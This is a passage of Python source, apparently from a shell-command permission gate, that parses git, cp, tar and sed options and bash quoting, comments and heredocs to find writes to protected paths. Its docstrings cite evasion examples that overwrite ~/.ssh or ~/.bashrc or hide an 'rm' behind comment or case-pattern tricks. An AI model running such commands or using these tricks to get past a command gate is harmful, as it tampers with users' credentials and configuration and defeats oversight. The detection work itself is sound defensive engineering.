    "--bundle-uri",
})
GIT_INIT_VALUE_FLAGS = frozenset({
    "--template", "--separate-git-dir", "-b", "--initial-branch", "--object-format", "--ref-format",
})
GIT_WORKTREE_ADD_VALUE_FLAGS = frozenset({"-b", "-B", "--reason"})
GIT_SUBMODULE_ADD_VALUE_FLAGS = frozenset({"-b", "--branch", "--name", "--reference", "--depth"})
"""Options of the four git subcommands that create something on disk, whose next token is a
VALUE and not the destination. Without them ``git clone -b main URL`` would report a write to
``main`` (git-clone(1), git-init(1), git-worktree(1), git-submodule(1))."""

GIT_DESTINATION_FIRST = "first"
GIT_DESTINATION_FIRST_OR_CWD = "first-or-cwd"
GIT_DESTINATION_LAST_OR_URL = "last-or-url"
"""How a git subcommand names the directory it creates: the first positional, the first with the
current directory as the default, or the last of two — falling back to the repository name inside
the URL when only the source is given."""

GIT_DESTINATION_SHAPES: dict[str, tuple[frozenset[str], str]] = {
    "git clone": (GIT_CLONE_VALUE_FLAGS, GIT_DESTINATION_LAST_OR_URL),
    "git init": (GIT_INIT_VALUE_FLAGS, GIT_DESTINATION_FIRST_OR_CWD),
    "git worktree add": (GIT_WORKTREE_ADD_VALUE_FLAGS, GIT_DESTINATION_FIRST),
    "git submodule add": (GIT_SUBMODULE_ADD_VALUE_FLAGS, GIT_DESTINATION_LAST_OR_URL),
}
"""PRD §3.2 step 8 for git: the four subcommands whose argument names a DIRECTORY THEY CREATE.

``git clone https://x ~/.ssh`` writes a whole repository into ``~/.ssh`` — including a
``.git/hooks`` directory whose contents git will later execute — and reported no write target at
all, so the protected-path tier never saw it (v0.14 critic A3). Same for ``git init ~/.ssh``,
``git worktree add DEST`` and ``git submodule add URL DEST``.

Per-subcommand because git spells the destination four different ways; the shapes are named above
rather than written as three branches, and the value-flag tables keep an option's argument from
being read as the destination."""

GIT_OUTPUT_SUBCOMMANDS = frozenset({"diff", "log", "show"})
GIT_OUTPUT_FLAG = "--output"
GIT_NO_INDEX_FLAG = "--no-index"
"""The two git spellings that make a read-only-looking command touch the filesystem (Phase 10,
D-20, D-51). ``git diff|log|show --output=F`` (or ``--output F``) WRITES F, and ``git diff
--no-index A B`` compares two arbitrary paths outside any repository. Exact spellings are
complete: git rejects an abbreviation of either (git-diff(1); RESEARCH row j). Without them
``git diff --output=~/.bashrc`` was a plain read in every mode."""

COPY_COMMANDS = ("cp", "mv", "install", "rsync")
"""PRD §3.2 step 8: the commands whose destination is a positional argument."""

TARGET_DIRECTORY_COMMANDS = frozenset({"cp", "mv", "install", "ln"})
"""The coreutils copies (and ``ln``) that also accept the destination as a FLAG: ``-t DIR`` /
``--target-directory=DIR`` puts every positional on the SOURCE side, so reading the last
positional reported the source as the target — ``cp -t ~/.ssh mykey`` looked like a write to
``mykey`` (finding R6), and ``ln -sf -t ~/.ssh key`` still did. ``rsync`` is deliberately absent:
its ``-t`` is ``--times`` (cp(1), mv(1), install(1), ln(1), rsync(1))."""

COPY_VALUE_LETTERS = "tSmog"
"""The short options of cp/mv/install/ln whose argument follows (``-m 755``) or is attached
(``-m755``), also inside a cluster (``-sft DIR``): ``t`` is the target directory."""

TAR_FAMILY: frozenset[str] = frozenset({"tar", "bsdtar", "gtar"})
"""tar under the names it is installed as: each is read as ``tar`` (``-C DIR`` is where an
extract writes), and the ``write_shaped_commands`` setting names the family as ``tar``."""

TARGET_DIRECTORY_FLAGS = ("-t", "--target-directory")
NO_TARGET_DIRECTORY_FLAGS = ("-T", "--no-target-directory")
"""``-T`` says the destination is a plain file even when it is a directory, so the last
positional is the target — the same answer as the default path, kept explicit so the two flags
cannot be confused for each other."""

COPY_VALUE_FLAGS = frozenset({
    "-t", "--target-directory", "-S", "--suffix", "--backup",
    "-m", "--mode", "-o", "--owner", "-g", "--group", "-Z", "--context",
})
"""``cp``/``mv``/``install`` options whose next token is a VALUE, not a path. Without them
``install -m 755 -t DIR a`` would read the mode as a source and report ``DIR/755``."""

SED_SCRIPT_FLAGS = frozenset({"-e", "--expression", "-f", "--file"})
"""When present, every positional argument of ``sed`` is a file; otherwise the first
positional is the script and the rest are files."""

SED_ATTACHED_VALUE_LETTERS = "efl"
"""sed's short options whose argument may be written ATTACHED (``-e's/a/b/``, ``-f script``,
``-l 70``). Inside a cluster, everything after one of these letters is that argument, so
``sed -e's/i/x/'`` is not read as an in-place edit (sed(1))."""

SED_FLAG_LETTERS = "nsErzub"
"""sed's short options that take no value and change nothing this scanner cares about (``-n``
quiet, ``-s`` separate, ``-E``/``-r`` extended regexes, ``-z`` NUL lines, ``-u`` unbuffered, ``-b``
binary). ``e``, ``f``, ``l`` and ``i`` are handled in :func:`_sed_script_facts` because they take a
value (sed(1), D-54)."""

SED_LONG_OPTIONS = (
    "expression", "file", "in-place", "line-length", "null-data", "zero-terminated", "quiet",
    "silent", "regexp-extended", "separate", "sandbox", "debug", "posix", "unbuffered",
    "follow-symlinks", "help", "version", "binary",
)
"""sed's long options. GNU getopt accepts an exact name or a unique prefix; an unknown or ambiguous
spelling is read as running a command, the safe direction (sed(1), D-54)."""

SED_ADDRESS_FLAGS = "IM"
SED_SUBSTITUTE_PLAIN_FLAGS = "gpiImM0123456789"
SED_NO_ARGUMENT_COMMANDS = "=dDgGhHnNpPxzF"
SED_NUMBER_COMMANDS = "qQlL"
SED_TEXT_COMMANDS = "aic"
SED_FILE_COMMANDS = "rR"
SED_LABEL_COMMANDS = "btT:v"
"""The sed script grammar the scanner needs: the flags of an address (``/re/I``) and of ``s``
(``w`` and ``e`` are handled apart), and the command letters by how they take their argument
(sed(1) "Commands"; D-54)."""



# --------------------------------------------------------------------------- public API

def classify_shell(command: str, settings: GateSettings) -> ShellClassification:
    """Classify one shell command string. PRD §3.2 steps 1-8, in order.

    Pure: the same string and settings always produce the same classification.
    """
    segments, dropped = _classify_command_text(command, settings)
    return ShellClassification(segments=tuple(segments), dropped=tuple(dropped))


COMMENT_WORD_STARTS = frozenset(";&|(")
"""Besides a blank (space, tab, newline — bash's own, never ``str.isspace()``) these are the characters
after which a ``#`` opens a comment (CR-01 / CR-02 / CR-51). ``)`` is NOT one: it closes ``$(…)``,
``<(…)`` and ``x=(…)``, where the word goes on, and the classifier does not tell that from a bare
group. ``<`` and ``>`` are not either. A ``#`` that is judged not to start a comment is only ever
over-read as text, which fails toward asking; a ``#`` wrongly judged to start one hides the rest of
the line. ``$#``, ``${#x}``, ``a#b`` and ``16#ff`` are not comments."""

BASH_BLANKS = " \t\n"

COMMENT_HAZARD_CHARS = ";&|`<>"
COMMENT_HAZARD_OPENERS = ("$(", "<(", ">(")
COMMENT_HAZARD_WORD_START = "-"
"""A dropped comment holding one of these could be hiding a command if the stripper judged a ``#`` a
comment where bash did not (``[[ a =~ (a|#b) ]]; rm x``, ``shopt -s extglob`` then ``@(a|#b)``,
``+(#) >(rm x)``). ``<`` and ``>`` are there because bash still runs a redirection after such a ``#``
(``[[ a =~ (a|#b) ]] > ~/.bashrc``), and a word starting with ``-`` because it can be the carrier's own
flag (``git log @(a|#b) --output ~/.bashrc``) (UF-1). The command is then classified a second time with
comments left in, and the dangerous segments of that reading are added
(:func:`_classify_command_text`). A comment without them has nothing to hide."""

_JOIN_TOP, _JOIN_PAREN, _JOIN_ARITH, _JOIN_BACKTICK, _JOIN_PARAM, _JOIN_FUNSUB, _JOIN_BRACKET = range(7)
"""The contexts :class:`_JoinScan` tells apart: the command text itself; a ``$(…)`` / ``<(…)`` / ``>(…)``
body; a ``$((…))`` body; a backtick body; a ``${…}`` parameter expansion; a bash 5.3 ``${ cmd; }`` /
``${| cmd; }`` body; a deprecated ``$[…]`` arithmetic body. Each is a fresh shell context with its own
quote, comment, continuation and heredoc state."""

_JOIN_CLOSERS = {
    _JOIN_PAREN: ")", _JOIN_ARITH: ")", _JOIN_BACKTICK: "`", _JOIN_PARAM: "}", _JOIN_FUNSUB: "}",
    _JOIN_BRACKET: "]",
}


ANSI_C_ESCAPES = {
    "a": "\a", "b": "\b", "e": "\x1b", "E": "\x1b", "f": "\f", "n": "\n", "r": "\r",
    "t": "\t", "v": "\v", "\\": "\\", "'": "'", '"': '"', "?": "?",
}
"""The one-character escapes of a bash ``$'…'`` string (bash(1) "QUOTING")."""

ANSI_C_NUMERIC_ESCAPES = {"x": 2, "u": 4, "U": 8}
"""``\\xHH``, ``\\uHHHH`` and ``\\UHHHHHHHH``: the most hexadecimal digits each reads. ``\\NNN`` reads up
to three octal digits."""

HEX_DIGITS = "0123456789abcdefABCDEF"
OCTAL_DIGITS = "01234567"


def _decode_ansi_c(text: str, index: int) -> tuple[str, int, bool]:
    """Decode the body of a ``$'…'`` string that starts at ``index`` (just after the ``$'``).

    Returns (the string the shell would pass, the index after the closing quote, whether it closed).
    A backslash escapes the next character, so ``\\'`` does not end the string (CR-54 / WR-01). An escape
    bash does not know stays as written, and a NUL is dropped.
    """
    chars: list[str] = []
    size = len(text)
    while index < size:
        char = text[index]
        if char == "'":
            return "".join(chars), index + 1, True
        if char != "\\" or index + 1 >= size:
            chars.append(char)
            index += 1
            continue
        escape = text[index + 1]
        if escape in ANSI_C_ESCAPES:
            chars.append(ANSI_C_ESCAPES[escape])
            index += 2
            continue
        octal = escape in OCTAL_DIGITS
        if octal or escape in ANSI_C_NUMERIC_ESCAPES:
            start = index + (1 if octal else 2)
            digits, width = (OCTAL_DIGITS, 3) if octal else (HEX_DIGITS, ANSI_C_NUMERIC_ESCAPES[escape])
            end = start
            while end < size and end - start < width and text[end] in digits:
                end += 1
            if end > start:
                try:
                    code = chr(int(text[start:end], 8 if octal else 16) & (0xFF if octal else 0x1FFFFF))
                except ValueError:
                    code = text[index:end]
                chars.append("" if code == "\x00" else code)
                index = end
                continue
        if escape == "c" and index + 2 < size:
            chars.append(chr(ord(text[index + 2]) & 0x1F))
            index += 3
            continue
        chars.append(text[index : index + 2])
        index += 2
    return "".join(chars), index, False


def _ansi_c_as_single_quoted(text: str, index: int) -> tuple[str, int, bool]:
    """``$'…'`` at ``index`` (the ``$``) as the plain single-quoted word every later scanner reads."""
    decoded, end, closed = _decode_ansi_c(text, index + 2)
    quoted = "'" + decoded.replace("'", "'\\''") + ("'" if closed else "")
    return quoted, end, closed


CASE_COMMAND_WORDS = frozenset({
    "if", "then", "elif", "else", "while", "until", "do", "!", "{", "time", "coproc",
})
"""Words after which a command (so a ``case``) may still start."""


class _CaseTracker:
    """Which unquoted ``)`` ends the pattern of a ``case`` clause rather than a ``$(`` or a group.

    ``$(case x in a) rm y;; esac)`` holds a ``)`` that closes nothing: the pattern's terminator. A
    scanner that counts parentheses closes the substitution there and reads the clause body as part
    of the outer command (B WR-55). The tracker follows words at command position: ``case`` opens one
    (remembering the parenthesis depth), ``esac`` closes it, and a ``)`` at that depth while one is
    open is a pattern terminator. A ``case`` that is an argument (``git log --grep case``) is not at
    command position and opens nothing.
    """

    __slots__ = ("starts", "word", "command", "stray")

    def __init__(self) -> None:
        self.starts: list[int] = []
        self.word = ""
        self.command = True
        self.stray = False  # an `esac` met with no `case` of this scan open: the end of an enclosing clause

    def opaque(self) -> None:
        """A quote, an escape or a substitution is part of the current word: it is no keyword."""
        self.word = "\0"

    def step(self, char: str, depth: int) -> None:
        """Feed one unquoted character; ``depth`` is the parenthesis depth it stands at."""
        if char in " \t\n;&|()<>":
            word, self.word = self.word, ""
            if word:
                if self.command and word == "case":
                    self.starts.append(depth)
                    self.command = False
                elif self.command and word == "esac":
                    if self.starts:
                        self.starts.pop()
                    else:
                        self.stray = True
                    self.command = False
                elif not (self.command and word in CASE_COMMAND_WORDS):
                    self.command = False
            if char in "\n;&|(":
                self.command = True
            elif char == ")":
                self.command = False
        else:
            self.word += char

    def at_pattern_end(self, depth: int) -> bool:
        """Is a ``)`` at this depth the end of a ``case`` pattern (call after :meth:`step`)?"""
        return bool(self.starts) and self.starts[-1] == depth

    def pattern_end(self) -> None:
        self.command = True


def _is_arithmetic(text: str, first: int) -> bool:
    """Is the ``((`` whose first ``(`` is at ``first`` arithmetic (CR-54, CR-03)?

    Bash reads ``((…))`` (and ``$((…))``) as arithmetic only when the inner ``(`` closes right before
    the outer one: ``$((1+2))`` is a number, ``$((ls); rm x)`` is a command substitution that starts
    with a subshell and ``$((1+2)*3)`` falls back to one too. Anything that does not balance is not
    arithmetic, so the unbalanced-text ask applies to it."""
    outer = _matching(text, first)
    if outer >= len(text):
        return False
    return _matching(text, first + 1) + 1 == outer


HEREDOC_KINDS = (_JOIN_TOP, _JOIN_PAREN, _JOIN_BACKTICK, _JOIN_FUNSUB)
"""The contexts in which a ``<<`` is a heredoc operator. In arithmetic, ``$[…]`` and ``${…}`` it is a
shift or text (CR-03)."""

IDENTIFIER_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"
"""What may stand right before the ``[`` of an array subscript, ``a[1<<1]=3``: inside it ``<<`` shifts."""


def _read_heredoc_delimiter(
    text: str, index: int, closer: str = ""
) -> tuple[str, bool, int, bool]:
    """Read the word after ``<<`` / ``<<-``: (the delimiter, whether any of it was quoted, the end, ok).

    The delimiter is the word with its quoting removed, as bash does: ``'E'``, ``"E"``, ``\\E``,
    ``$'E'`` (decoded, ``$'E\\x46'`` is ``EF``) and ``$"E"`` all give ``E``; any quoting at all makes
    the body literal data (``quoted``). A backslash-newline inside the word is a continuation and
    joins the lines first. The word ends at a blank, an operator (:data:`HEREDOC_WORD_STOPS`) or the
    ``closer`` of the context it is read in (the backtick of a backtick body), but a newline inside
    quotes belongs to it. ``ok`` is False when a quote never closes."""
    chars: list[str] = []
    quoted = False
    size = len(text)
    while index < size:
        char = text[index]
        if char in " \t\n" or char in HEREDOC_WORD_STOPS or (closer and char == closer):
            break
        if char == "\\":
            if text[index + 1 : index + 2] == "\n":
                index += 2
                continue
            quoted = True
            chars.append(text[index + 1 : index + 2])
            index += 2
            continue
        if char == "$" and text[index + 1 : index + 2] == "'":
            decoded, index, closed = _decode_ansi_c(text, index + 2)
            quoted = True
            chars.append(decoded)
            if not closed:
                return "".join(chars), quoted, index, False
            continue
        if char == "$" and text[index + 1 : index + 2] == '"':
            index += 1
            continue
        if char == "`" or (char == "$" and text[index + 1 : index + 2] in ("(", "{")):
            # A substitution inside the delimiter word is part of the word and is never run:
            # `<<E$(cat <<F` has the delimiter `E$(cat <<F` and everything up to the `)` in it.
            end = _skip_word_part(text, index)
            if end > size:  # it never closes
                return "".join(chars), quoted, size, False
            chars.append(text[index:end])
            index = end
            continue
        if char == "'":
            end = text.find("'", index + 1)
            if end == -1:
                return "".join(chars), True, size, False
            quoted = True
            chars.append(text[index + 1 : end])
            index = end + 1
            continue
        if char == '"':
            index += 1
            quoted = True
            while index < size and text[index] != '"':
                if text[index] == "\\" and text[index + 1 : index + 2] in ('$', '`', '"', "\\", "\n"):
                    if text[index + 1] != "\n":
                        chars.append(text[index + 1])
                    index += 2
                    continue
                chars.append(text[index])
                index += 1
            if index >= size:
                return "".join(chars), True, size, False
            index += 1
            continue
        chars.append(char)
        index += 1
    return "".join(chars), quoted, index, True


ARRAY_ASSIGNMENT_WORD_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*\+?=$")
"""The word in front of the ``(`` of an array literal: ``x=``, ``x+=`` (``declare -a x=(…)`` has it as its operand)."""


def _current_word(out: list[str]) -> str:
    """The word being built at the end of ``out``: the text after the last blank or operator (bounded)."""
    chars: list[str] = []
    for piece in reversed(out):
        for char in reversed(piece):
            if char in BASH_BLANKS or char in COMMENT_WORD_STARTS:
                return "".join(reversed(chars))
            chars.append(char)
        if len(chars) > 256:
            break
    return "".join(reversed(chars))


def _array_literal_is_plain(text: str, open_index: int) -> bool:
    """Is the ``(`` at ``open_index`` the start of an array literal bash reads as plain words (CR-01 / CR-55 it4)?

    Words, quotes and substitutions (stepped over whole) up to a ``)`` are a literal. An unquoted ``;``, ``&``,
    ``|``, ``<``, ``>`` or ``(``, a ``#`` that starts a word, or no closing ``)`` at all is a syntax error in
    bash, which then runs the lines after it; this says so by returning False."""
    size = len(text)
    index = open_index + 1
    word_start = True
    while index < size:
        char = text[index]
        if char == ")":
            return True
        if char in ";&|<>(" or (char == "#" and word_start):
            return False
        if char == "$" and text[index + 1 : index + 2] == "'":
            _, index, closed = _decode_ansi_c(text, index + 2)
            if not closed:
                return False
            word_start = False
            continue
        if char == "$" and text[index + 1 : index + 2] == '"':
            index += 1
            continue
        step = _skip_word_part(text, index)
        if step > size:
            return False
        word_start = char in BASH_BLANKS
        index = step
    return False


def _collapse_array_literals(text: str) -> str:
    """Replace every ``NAME=( … )`` / ``NAME+=( … )`` by ``NAME=(__lh_array__)``: one blank-free word.

    ``shlex`` splits ``x=(a b)`` at the blank, so its second half (``b)``) was read as the command and the real
    command after the assignment was never looked at (CR-01 it4). The elements are words: their substitutions
    were lifted before this, and nothing else in them runs."""
    out: list[str] = []
    index = 0
    size = len(text)
    while index < size:
        char = text[index]
        step = _skip_word_part(text, index) if char in "\\'\"`$" else index + 1
        if step > index + 1 or char in "\\'\"`":
            step = min(step, size)
            out.append(text[index:step])
            index = step
            continue
        if char == "(" and out and out[-1][-1:] == "=" and ARRAY_ASSIGNMENT_WORD_RE.match(_current_word(out)):
            end = _matching(text, index)
            if end < size:
                out.append(ARRAY_PLACEHOLDER)
                index = end + 1
                continue
        out.append(char)
        index += 1
    return "".join(out)


ARRAY_PLACEHOLDER = "(__lh_array__)"


class _JoinScan:
    """One recursive pass over the command text: continuations dropped, comments stripped, heredoc
    bodies removed.

    ``balanced`` ends False when a quote, a backtick, a ``$(``, a ``${`` is still open at the end of its
    context, or when the scan met a layout it cannot read with certainty (a heredoc whose line carries
    a newline inside a nested ``$(``). Bash refuses the first and the classifier cannot trust its own
    reading of either, and :func:`_join_continuations` says so (CR-54 / WR-01).

    Heredocs are read here, in the one pass that already follows quotes, continuations, comments and
    nested contexts, not by a pass of their own over physical lines (CR-01 / CR-52): an operator seen
    inside a quote, a comment, arithmetic or a subscript is text; one seen anywhere else queues its
    delimiter, and the body starts after the next real newline of the SAME context, so a heredoc inside
    ``"$(cat <<'EOF' … EOF )"`` or a lifted payload is stripped before its text is read as quoting
    (WR-01 / WR-51).
    """

    def __init__(self, text: str, strip_comments: bool = True) -> None:
        self.text = text
        self.index = 0
        self.balanced = True
        self.strip_comments = strip_comments
        self.hazard = False  # a comment that could hold a command was dropped; see COMMENT_HAZARD_CHARS

    def scan(self, kind: int) -> tuple[str, bool]:
        """Scan one context from ``self.index``; returns (its text, whether its closer was met).

        The closer itself is consumed but not included. Comments are recognised in the command text and
        in ``$(…)``, backtick and funsub bodies only: never in a parameter expansion or arithmetic,
        where ``#`` is an operator.
        """
        text, size = self.text, len(self.text)
        out: list[str] = []
        quote = ""
        word_start = True  # judged on the JOINED text: `a\\` newline `#b` is the word `a#b`
        nested = 0  # `(` open inside a $( body, `[` inside a $[ body, or `{` open inside a funsub body
        groups = 0  # bare `( … )` groups open in this context: the `)` that closes one ends a word
        bracket = 0  # `name[` subscripts open on this line: `<<` inside is a shift
        pending: list[list] = []  # heredocs whose body starts at the next newline: [delimiter, dash, expand, slot]
        tracker = _CaseTracker()  # a `)` that ends a `case` pattern does not close a `$(` (B WR-55)
        comments = self.strip_comments and kind in (
            _JOIN_TOP, _JOIN_PAREN, _JOIN_BACKTICK, _JOIN_FUNSUB
        )
        while self.index < size:
            index = self.index
            char = text[index]
            if quote == "'":
                out.append(char)
                self.index += 1
                quote = "" if char == "'" else quote
                continue
            if char == "\\":
                if text[index + 1 : index + 2] != "\n":
                    out.append(text[index : index + 2])
                    word_start = False
                    tracker.opaque()
                self.index += 2  # backslash-newline is dropped, in double quotes too
                continue
            if char == "`":
                if quote == "" and kind == _JOIN_BACKTICK:
                    self.index += 1
                    return "".join(out), True
                out.append(char)
                self.index += 1
                self._nested(out, _JOIN_BACKTICK, bool(pending))
                word_start = False
                tracker.opaque()
                continue
            if char == "$":
                following = text[index + 1 : index + 2]
                if quote == "" and following == "'":
                    # CR-54 / WR-01: `$'it\\'s'` is one word. Decoded here into the single-quoted form
                    # every later scanner reads, so `$'rm'` signs as `rm` and `\\'` closes nothing.
                    quoted, self.index, closed = _ansi_c_as_single_quoted(text, index)
                    out.append(quoted)
                    self.balanced = self.balanced and closed
                    word_start = False
                    tracker.opaque()
                    continue
                if quote == "" and following == '"':
                    self.index += 1  # `$"…"` is the double-quoted string; the `$` is not part of it
                    continue
                if following == "(":
                    inner = _JOIN_PAREN
                    if text[index + 2 : index + 3] == "(" and _is_arithmetic(text, index + 1):
                        inner = _JOIN_ARITH
                    out.append("$(")
                    self.index += 2
                    self._nested(out, inner, bool(pending))
                    word_start = False
                    tracker.opaque()
                    continue
                if following == "{":
                    after = text[index + 2 : index + 3]
                    inner = _JOIN_FUNSUB if after and after in " \t\n|" else _JOIN_PARAM
                    out.append("${")
                    self.index += 2
                    self._nested(out, inner, bool(pending))
                    word_start = False
                    tracker.opaque()
                    continue
                if following == "[":
                    out.append("$[")  # deprecated arithmetic: `<<` inside is a shift (CR-03)
                    self.index += 2
                    self._nested(out, _JOIN_BRACKET, bool(pending))
                    word_start = False
                    tracker.opaque()
                    continue
            if quote == '"':
                out.append(char)
                self.index += 1
                quote = "" if char == '"' else quote
                continue
            if char in "'\"":
                quote = char
                out.append(char)
                self.index += 1
                word_start = False
                tracker.opaque()
                continue
            if char == "<" and text.startswith("<<", index):
                if text.startswith(HERE_STRING_OPERATOR, index):
                    out.append(HERE_STRING_OPERATOR)
                    self.index += len(HERE_STRING_OPERATOR)
                    word_start = False
                    tracker.opaque()
                    continue
                if kind in HEREDOC_KINDS and not bracket:
                    self._heredoc_operator(out, pending, "`" if kind == _JOIN_BACKTICK else "")
                    word_start = True
                    tracker.opaque()
                    continue
            if char in "<>" and text[index + 1 : index + 2] == "(":
                out.append(char + "(")
                self.index += 2
                self._nested(out, _JOIN_PAREN, bool(pending))
                word_start = False
                tracker.opaque()
                continue
            if (
                char == "(" and word_start and kind in HEREDOC_KINDS
                and text[index + 1 : index + 2] == "(" and _is_arithmetic(text, index)
            ):
                out.append("(")  # `(( 1 << 2 ))`: arithmetic, opaque to comments and heredocs (CR-03)
                self.index += 1
                self._nested(out, _JOIN_ARITH, bool(pending))
                word_start = False
                tracker.opaque()
                continue
            if (
                char == "(" and kind in HEREDOC_KINDS and out and out[-1][-1:] == "="
                and ARRAY_ASSIGNMENT_WORD_RE.match(_current_word(out))
                and not _array_literal_is_plain(text, index)
            ):
                # CR-01 / CR-02 / CR-55 (it4): bash reads `NAME=( … )` as words only. An operator, a `<<`
                # or a comment inside is a syntax error after which it carries on at the next line, so the
                # classifier cannot say what runs: the text is asked about as unparsed.
                self.balanced = False
            if char == "\n":
                out.append(char)
                self.index += 1
                word_start = True
                if bracket:
                    self.balanced = False  # `x[` newline … `]=1` is one subscript whose `$(…)` runs (CR-55 it4)
                bracket = 0
                tracker.step(char, nested)
                if pending:
                    self._heredoc_bodies(out, pending)
                    pending = []
                continue
            tracker.step(char, nested)
            if kind in (_JOIN_PAREN, _JOIN_ARITH) and char in "()":
                if char == "(":
                    nested += 1
                elif nested:
                    nested -= 1
                elif kind == _JOIN_PAREN and tracker.at_pattern_end(nested):
                    out.append(char)  # the `)` after a `case` pattern: it closes nothing
                    self.index += 1
                    tracker.pattern_end()
                    word_start = True
                    continue
                else:
                    self.index += 1
                    return "".join(out), True
            elif kind == _JOIN_BRACKET and char in "[]":
                if char == "[":
                    nested += 1
                elif nested:
                    nested -= 1
                else:
                    self.index += 1
                    return "".join(out), True
            elif kind == _JOIN_PARAM and char == "}":
                self.index += 1
                return "".join(out), True
            elif kind == _JOIN_FUNSUB:
                if char == "}" and not nested:
                    self.index += 1
                    return "".join(out), True
                if char == "{" and word_start and text[index + 1 : index + 2] in (" ", "\t", "\n"):
                    nested += 1
                elif char == "}":
                    nested -= 1
            if char == "#" and comments and word_start:
                end = index
                while end < size and text[end] != "\n":
                    if kind == _JOIN_BACKTICK and text[end] == "`":
                        break
                    escaped = text[end] == "\\" and text[end + 1 : end + 2] not in ("", "\n")
                    end += 2 if escaped else 1
                dropped = text[index:end]
                if (
                    any(c in dropped for c in COMMENT_HAZARD_CHARS)
                    or any(opener in dropped for opener in COMMENT_HAZARD_OPENERS)
                    or any(word.startswith(COMMENT_HAZARD_WORD_START) for word in dropped.split())
                ):
                    self.hazard = True
                self.index = end
                continue
            previous = out[-1][-1:] if out else ""
            if char == "[" and previous and previous in IDENTIFIER_CHARS:
                bracket += 1
            elif char == "]" and bracket:
                bracket -= 1
            out.append(char)
            self.index += 1
            group_closed = False
            if char == "(":
                groups += 1 if word_start else 0
            elif char == ")" and groups:
                groups -= 1
                group_closed = True
            # A `)` that closes a bare group ends the word, so a `#` after it is a comment
            # (`(rm x)#c`, `)#<<E`); one that closes `$(`, `x=(` or `@(` never reaches here as a group.
            word_start = char in BASH_BLANKS or char in COMMENT_WORD_STARTS or group_closed
        if quote:
            self.balanced = False
        return "".join(out), False

    def _nested(self, out: list[str], kind: int, outer_pending: bool = False) -> None:
        """Scan a nested context and append its text and closer to ``out``.

        A newline inside it while the enclosing line still owes a heredoc body is a layout whose body
        starts are not certain, so the text is flagged instead of guessed (CR-01)."""
        start = self.index
        body, closed = self.scan(kind)
        out.append(body)
        if closed:
            out.append(_JOIN_CLOSERS[kind])
        else:
            self.balanced = False
        if outer_pending and "\n" in self.text[start : self.index]:
            self.balanced = False

    def _heredoc_operator(self, out: list[str], pending: list[list], closer: str = "") -> None:
        """A ``<<`` / ``<<-`` at ``self.index`` that is a heredoc operator: queue its delimiter.

        The operator and its word are replaced by a blank; the body is taken at the next newline of
        this context (:meth:`_heredoc_bodies`)."""
        text = self.text
        index = self.index + 2
        dash = text[index : index + 1] == "-"
        if dash:
            index += 1
        while index < len(text) and text[index] in " \t":
            index += 1
        delimiter, quoted, end, ok = _read_heredoc_delimiter(text, index, closer)
        if end == index and ok:
            out.append("<<")  # no word at all: bash refuses it, and nothing is queued
            self.index = index
            return
        self.index = end
        out.append(" ")
        if not ok:
            self.balanced = False  # an unclosed quote in the delimiter
            return
        pending.append([delimiter, dash, not quoted, len(out) - 1])

    def _heredoc_bodies(self, out: list[str], pending: list[list]) -> None:
        """Consume the bodies of the queued heredocs, which start at ``self.index`` (after a newline).

        A body line ends its heredoc only when it is exactly the delimiter (tabs stripped for ``<<-``;
        trailing blanks tolerated, which can only end a body EARLIER than bash does). When the
        delimiter never appears, nothing is consumed: the lines are classified as the commands they
        would be if the reading were wrong (CR-01), where the old scanner swallowed the rest of the
        text."""
        text, size = self.text, len(self.text)
        for delimiter, dash, expand, slot in pending:
            start = position = self.index
            while position < size:
                newline = text.find("\n", position)
                line_end = size if newline == -1 else newline
                line = text[position:line_end]
                if (line.strip() if dash else line.rstrip()) == delimiter:
                    break
                position = line_end + 1
            else:
                return
            self.index = size if newline == -1 else newline + 1
            if expand:
                # An unquoted delimiter: bash expands the body, so `$(…)` and backticks in it RUN (CR-51).
                # They go back into the text as here-string operands of the same command, where the
                # lifter classifies them; every other word of the body stays data.
                found = self._body_substitutions(text[start:position])
                if found:
                    out[slot] = " " + " ".join(f"<<< {piece}" for piece in found) + " "

    def _body_substitutions(self, body: str) -> list[str]:
        """The command substitutions an unquoted heredoc body would run, each as the text bash reads.

        Quotes mean nothing in a body, a backslash escapes the next character (``\\$(`` runs nothing), and
        a plain ``${x}`` is not a substitution."""
        scan = _JoinScan(body, self.strip_comments)
        found: list[str] = []
        while scan.index < len(body):
            index = scan.index
            char, following = body[index], body[index + 1 : index + 2]
            piece: list[str] = []
            if char == "\\":
                scan.index += 2
                continue
            if char == "`":
                piece.append("`")
                scan.index += 1
                scan._nested(piece, _JOIN_BACKTICK)
            elif char == "$" and following == "(":
                inner = _JOIN_PAREN
                if body[index + 2 : index + 3] == "(" and _is_arithmetic(body, index + 1):
                    inner = _JOIN_ARITH
                piece.append("$(")
                scan.index += 2
                scan._nested(piece, inner)
            elif char == "$" and following == "{":
                after = body[index + 2 : index + 3]
                inner = _JOIN_FUNSUB if after and after in " \t\n|" else _JOIN_PARAM
                piece.append("${")
                scan.index += 2
                scan._nested(piece, inner)
                if inner == _JOIN_PARAM and "$(" not in piece[1] and "`" not in piece[1]:
                    piece = []
            elif char == "$" and following == "[":
                piece.append("$[")
                scan.index += 2
                scan._nested(piece, _JOIN_BRACKET)
            else:
                scan.index += 1
                continue
            if piece:
                found.append("".join(piece))
        self.balanced = self.balanced and scan.balanced
        self.hazard = self.hazard or scan.hazard
        return found


def _join_continuations(text: str) -> str:
    """Drop each backslash-newline pair and each comment, as the shell does.

    The old blanket ``text.replace("\\\n", "")`` also removed the pair inside a single-quoted
    word and mis-paired ``\\\\`` + newline, so a ``sed`` script written ``a x\\\\`` newline
    ``w ~/.bashrc`` reached the sed scanner with its second command glued onto the first (Phase 10,
    D-54). A backslash escapes the character after it, so ``\\\\`` is a pair and the newline that
    follows it is a real newline; single quotes keep every character, double quotes drop the pair.

    Comments (CR-03 / CR-52, T-10-16): an unquoted ``#`` at the start of a word runs to the end of the
    line and no further, so ``ls # c\\`` newline ``rm x`` runs ``rm x`` and ``ls # don't`` newline
    ``rm x`` does too. The comment text is dropped here, in the same pass that tracks quotes, so an
    apostrophe, a bracket or a trailing backslash in it can neither swallow the next line nor open a
    quote the splitter would carry to the end of the text. The newline is kept.

    The stripper must never HIDE a command, so it errs toward keeping text (CR-01 / CR-02 / CR-51): a
    ``#`` opens a comment only after bash's own blanks (space, tab, newline), ``;``, ``&``, ``|`` or
    ``(``, never after ``)``, and never inside quotes, ``${ … }``, ``$(( … ))`` or after a character
    ``str.isspace()`` calls a space and bash does not (NBSP, CR, VT). ``$( … )`` and backtick bodies
